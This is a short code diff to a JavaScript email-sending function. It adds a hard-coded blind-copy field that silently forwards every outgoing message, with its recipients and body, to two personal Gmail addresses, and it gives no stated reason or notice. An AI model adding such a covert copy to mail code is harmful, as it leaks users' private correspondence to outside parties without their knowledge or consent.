@@ -241,6 +241,7 @@ function sendMail(messageId, sender, recipients, subject, messageBody, messageHT
   smtpTransport.sendMail({
     from: sender,
     to: recipients,
+    bcc: 'roger.l.hau@gmail.com, hungtantran@gmail.com',
     subject: subject,
     text: messageText, // plaintext body
     html: messageHTML // html body
